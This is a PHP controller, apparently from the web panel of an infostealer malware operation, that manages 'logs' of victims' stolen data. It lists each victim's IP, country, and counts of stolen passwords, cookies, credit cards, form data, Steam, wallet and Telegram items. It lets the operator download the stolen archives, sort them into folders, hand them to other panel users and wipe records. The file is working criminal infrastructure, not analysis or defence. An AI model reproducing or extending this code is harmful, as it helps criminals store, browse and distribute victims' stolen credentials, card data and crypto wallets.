<?
class logs extends Main_controller{
public function __construct(){
parent::__construct();
 }
public function index($categpry = null){

$pap = 'panel';
if($this->session['user_id'] == 1){
if($categpry){
$manager = $this->db->get('category', ['id', 'name'], ['id' => $categpry]);
if(!$manager['id']) show_404();
}
$this->data['cat_name'] = $categpry ? $manager['name']:'Логи';
$this->data['manager_id'] = $categpry ? $manager['id']:0;
}else{
$pap = 'panelUser';
}
$this->data['content'] = $pap.'/logs';
$this->load->view('index', $this->data);

}

public function download($id = null){
if(!$id) show_404();

$row['id'] = $id;
if($this->session['user_id'] != 1){
$row['user_id'] = $this->session['user_id'];
}

$manager = $this->db->get('manager', '*', $row);
$result = $this->input->toJson($manager['result']);

if(!file_exists($result['path'])): show_404(); endif;
$this->force->download($manager['name'].'.zip', file_get_contents($result['path']));
}

public function ajax($name = null){
if(!$name) show_404();
if(!in_array($name, ['information', 'delete','deleteAll', 'deleteLog', 'transfer', 'addTransfer', 'deleteTransfer', 'change', 'selectUser', 'sulp', 'AllTransfer', 'selectUserAll'])) show_404();

echo $this->{$name}();
}

private function sulp(){
$id = $this->input->post('id');

$row['id'] = $id;
if($this->session['user_id'] != 1){
$row['user_id'] = $this->session['user_id'];
}

$si = $this->db->get('manager', '*', $row);

if($si['id']){
$view = !$si['view'] ? 1:0;
$this->db->save('manager', ['view' => $view], $si['id']);
}

}

private function change(){

$this->data['error'] = null;
$this->data['success'] = null;


$rules = [
'login' => array('field' => 'login', 'label' => 'Логин', 'rules' => 'trim|xss_clean'),
'p1' => array('field' => 'p1', 'label' => 'Пароль', 'rules' => 'required|sha1'),
'p2' => array('field' => 'p2', 'label' => 'Пароль 2', 'rules' => '')
];
$this->postValidation->set_rules($rules);


if($this->postValidation->run() == TRUE){
$data = $this->input->post(['p1', 'p2', 'login']);

$user['count'] = $this->db->count('users', ['login' => $this->session['user_login'], 'password' => $data['p1']]);

 if($user['count'] > 0){

if($data['p2']){
$data['p2'] = sha1($data['p2']);
$this->db->save('users', ['password' => $data['p2']], ['login' => $this->session['user_login']]);
$this->session->setUser([
'user_password' => $data['p2']
]);
}else{

if($this->session['user_login'] !== $data['login'] and $data['login'] !== ''):
$user['count_new'] = $this->db->count('users', ['login', $data['login']]);
if($user['count_new'] == 0):
$this->db->save('users', ['login' => $data['login']], ['login' => $this->session['user_login']]);
$this->session->setUser([
'user_login' => $data['login']
]);
endif;
endif;
}

$this->data['success'] = 'Успешно!';
 }else{
 $this->data['error'] = 'Неверный пароль!';
 }
}else{
 $this->data['error'] = $this->postValidation->error_string();
}

echo $this->data['success'] ? $this->input->toArray(['success' => $this->data['success']]):$this->input->toArray(['error' => $this->data['error']]);

}


private function information(){
$id = intval($this->input->post('id'));
if(!$id) exit('Не передан id!');

$row['id'] = $id;
if($this->session['user_id'] != 1){
$row['user_id'] = $this->session['user_id'];
}

$getdata = $this->db->get('manager', '*', $row);
$jsonUP = $this->input->toJson($getdata['result']);
if($getdata['id']){
?>
 <script type="text/javascript">
$(function () {
  $('[data-toggle="tooltip"]').tooltip();
}); 
  </script>
              <table style="width:100%;" class="table table-striped">
                <tbody>
                    <tr>
                        <td style="width: 30%;border-top: none;">Название</td>
                        <td style="float: right;border-top: none;"><? echo $getdata['name']; ?></td>
                    </tr>
                    <tr>
                        <td style="width: 30%;border-top: none;">Дата</td>
                        <td style="float: right;border-top: none;"><? echo date("d.m.Y", $jsonUP['time']); ?></td>
                    </tr>
                    <tr>
                        <td style="width: 30%;border-top: none;">IP</td>
                        <td style="float: right;border-top: none;"><? echo $getdata['ip']; ?></td>
                    </tr>
                    <tr>
                        <td style="width: 30%;border-top: none;">Страна</td>
                        <td style="float: right;border-top: none;"><? echo $jsonUP['country']; ?></td>
                    </tr>
                    <tr>
                        <td style="width: 30%;border-top: none;">Пароли</td>
                        <td style="float: right;border-top: none;"><? echo $jsonUP['p1']; ?> шт.</td>
                    </tr>
                    <tr>
                        <td style="width: 30%;border-top: none;">Куки</td>
                        <td style="float: right;border-top: none;"><? echo $jsonUP['p2']; ?> шт.</td>
                    </tr>
                    <tr>
                        <td style="width: 30%;border-top: none;">CC</td>
                        <td style="float: right;border-top: none;"><? echo $jsonUP['p3']; ?> шт.</td>
                    </tr>
                    <tr>
                        <td style="width: 30%;border-top: none;">Forms</td>
                        <td style="float: right;border-top: none;"><? echo $jsonUP['p4']; ?> шт.</td>
                    </tr>
                    <tr>
                        <td style="width: 30%;border-top: none;">Steam</td>
                        <td style="float: right;border-top: none;"><i class="fa fa-<? echo $jsonUP['p5'] ? 'check':'times'; ?>" aria-hidden="true"></i></td>
                    </tr>
                    <tr>
                        <td style="width: 30%;border-top: none;">Wallets</td>
                        <td style="float: right;border-top: none;"><i class="fa fa-<? echo $jsonUP['p6'] ? 'check':'times'; ?>" aria-hidden="true"></i></td>
                    </tr>
                    <tr>
                        <td style="width: 30%;border-top: none;">Telegram</td>
                        <td style="float: right;border-top: none;"><i class="fa fa-<? echo $jsonUP['p7'] ? 'check':'times'; ?>" aria-hidden="true"></i></td>
                    </tr>
                    <tr>
                        <td style="width: 30%;border-top: none;">Инструменты</td>
                        <td style="float: right;border-top: none;">
                        <div class="btn-group">
                           <a href="/logs/download/<? echo $getdata['id']; ?>" data-toggle="tooltip" title="Скачать" class="btn btn-default-outline"><i class="fa fa-download"></i></a>
                           <a href="editor/<? echo $getdata['id']; ?>" target="_blank" data-toggle="tooltip" title="Открыть архив" class="btn btn-default-outline"><i class="fa fa-file-archive-o"></i></a>
                        </div>
                        </td>
                    </tr>
                    <? if($this->session['user_id'] == 1){ ?>
                      <script type="text/javascript">
  $(document).ready(function() {
    $('#UserNews').select2();
  });
  </script>
                    <tr>
                        <td style="width: 30%;border-top: none;">Переместить в:</td>
                        <td style="border-top: none;">
                            <select id="selectCat" data-id="<? echo $getdata['id']; ?>" style="width: 100%;" class="form-control">
                                <option value="0" <? echo $getdata['category'] == 0 ? 'selected':''; ?>>Без папки</option>
                                <? $category = $this->db->select('category', '*'); ?>
                                <? foreach ($category as $cat) { ?>
                                <option value="<? echo $cat['id']; ?>" <? echo $getdata['category'] == $cat['id'] ? 'selected':''; ?>><? echo $cat['name']; ?></option>
                                <? } ?>
                            </select>
                        </td>
                    </tr>
                    <tr>
                        <td style="width: 30%;border-top: none;">Передать файл</td>
                        <td style="border-top: none;">
                            <select id="UserNews" data-id="<? echo $getdata['id']; ?>" style="width: 100%;" class="form-control">
                                <? $category = $this->db->select('users', '*'); ?>
                                <? foreach ($category as $cat) { ?>
                                <option value="<? echo $cat['id']; ?>" <? echo $getdata['user_id'] == $cat['id'] ? 'selected':''; ?>><? echo $cat['login']; ?></option>
                                <? } ?>
                            </select>
                        </td>
                    </tr>
                <? } ?>
                </tbody>
              </table>
<? if($this->session['user_id'] == 1){ ?>
<script type="text/javascript">
$("#selectCat").on('change', function (ev){
    var id = $(this).attr('data-id');
    $.post('/logs/ajax/transfer', {uid: id, id: this.value}, function (data){
    var str = JSON.parse(data);
    if('error' in str){
     toastr.error(str.error);
    }
    if('success' in str){
     toastr.success(str.success);
    }
    });
});

$("#UserNews").on('change', function (ev){
    var id = $(this).attr('data-id');
    $.post('/logs/ajax/selectUser', {uid: id, id: this.value}, function (data){
    var str = JSON.parse(data);
    if('error' in str){
     toastr.error(str.error);
    }
    if('success' in str){
     toastr.success(str.success);
    }
    });
});
</script>
<? } ?>
<?
}
}

private function addTransfer(){
if($this->session['user_id'] != 1){
exit;
}
$name = trim($this->input->post('name'));
if(!$name) exit();

$this->db->save('category', ['name' => $name]);
}

private function deleteTransfer(){
if($this->session['user_id'] != 1){
exit;
}
$id = intval($this->input->post('id'));
if(!$id) exit();
$ui = $this->db->count('category', ['id' => $id]);

if($ui <= 0) exit;
$upd = $this->db->select('manager', '*', ['category' => $id]);
foreach ($upd as $u) {
    $this->db->save('manager', ['category' => 0], $u['id']);
}

$this->db->delete('category', ['id' => $id]);
}

private function delete(){
$id = intval($this->input->post('id'));
if(!$id) exit($this->input->toArray(['error' => 'Не передан id!']));

$row['id'] = $id;
if($this->session['user_id'] != 1){
exit($this->input->toArray(['error' => 'Запрешенно!']));
}

$getdata = $this->db->get('manager', '*', $row);
if(!$getdata['id']) exit($this->input->toArray(['error' => 'Запрешенно!']));
$jsonUP = $this->input->toJson($getdata['result']);
if(file_exists($jsonUP['path'])): unlink($jsonUP['path']); endif;
$this->db->delete('manager', ['id' => $id]);

exit($this->input->toArray(['success' => 'Файл удалён!']));
}

private function deleteLog(){
if($this->session['user_id'] != 1){
exit;
}
$password = $this->input->post('password');
if(!$password) exit($this->input->toArray(['error' => 'Не задан пароль!']));
$password = sha1($password);

if($password != $this->session['user_password']) exit($this->input->toArray(['error' => 'Не правильный пароль!']));
$this->db->delete('logs');

exit($this->input->toArray(['success' => 'логи удалёны!']));
}

private function deleteAll(){
if($this->session['user_id'] != 1){
exit;
}
$password = $this->input->post('password');
if(!$password) exit($this->input->toArray(['error' => 'Не задан пароль!']));
$password = sha1($password);

if($password != $this->session['user_password']) exit($this->input->toArray(['error' => 'Не правильный пароль!']));
$getdata = $this->db->select('manager', '*');

foreach ($getdata as $try) {
$jsonUP = $this->input->toJson($try['result']);
if(file_exists($jsonUP['path'])): unlink($jsonUP['path']); endif;
$this->db->delete('manager', ['id' => $try['id']]);
}

exit($this->input->toArray(['success' => 'Файлы удалёны!']));
}

private function transfer(){
if($this->session['user_id'] != 1){
exit;
}
$id = intval($this->input->post('id'));
$uid = intval($this->input->post('uid'));
$ui = $this->db->count('category', ['id' => $id]);
$uui = $this->db->count('manager', ['id' => $uid]);
if($ui <= 0 and $id != 0) exit($this->input->toArray(['error' => 'Такой папки не существует!']));
if($uui <= 0) exit($this->input->toArray(['error' => 'Такого лога не существует!']));
if($uid <= 0) exit($this->input->toArray(['error' => 'Такой папки не существует!']));


$this->db->save('manager', ['category' => $id], $uid);
exit($this->input->toArray(['success' => 'Успешно перенесено!']));
}


private function AllTransfer(){
if($this->session['user_id'] != 1){
exit;
}
$id = intval($this->input->post('new_cat'));
$uid = intval($this->input->post('id_cat'));

$ids = $this->input->post('check_id');
$ui = $this->db->count('category', ['id' => $id]);

if($ui <= 0 and $id != 0) exit($this->input->toArray(['error' => 'Такой папки не существует!']));
if($uid < 0) exit($this->input->toArray(['error' => 'Такой папки не существует!']));

if(!is_array($ids) or !$ids) exit($this->input->toArray(['error' => 'Не выбранны логи!']));

foreach ($ids as $key => $value) {
$this->db->save('manager', ['category' => $id], ['id' => $value]);
}


exit($this->input->toArray(['success' => 'Успешно перенесено!']));
}

private function selectUserAll(){
if($this->session['user_id'] != 1){
exit;
}

$id = intval($this->input->post('user'));
$ids = $this->input->post('ids');


$ui = $this->db->count('users', ['id' => $id]);

if($ui <= 0 and $id > 0) exit($this->input->toArray(['error' => 'Такого пользователя не существует!']));
if(!is_array($ids) or !$ids) exit($this->input->toArray(['error' => 'Не выбранны логи!']));

foreach ($ids as $key => $value) {
$this->db->save('manager', ['user_id' => $id], ['id' => $value]);
}

exit($this->input->toArray(['success' => 'Успешно передано!']));
}


private function selectUser(){
if($this->session['user_id'] != 1){
exit;
}

$id = intval($this->input->post('id'));
$uid = intval($this->input->post('uid'));
$ui = $this->db->count('users', ['id' => $id]);
$uui = $this->db->count('manager', ['id' => $uid]);
if($ui <= 0) exit($this->input->toArray(['error' => 'Такого пользователя не существует!']));
if($uui <= 0) exit($this->input->toArray(['error' => 'Такого лога не существует!']));
if($uid <= 0) exit($this->input->toArray(['error' => 'Такого пользователя не существует!']));


$this->db->save('manager', ['user_id' => $id], $uid);
exit($this->input->toArray(['success' => 'Успешно перенесено!']));
}

}

?>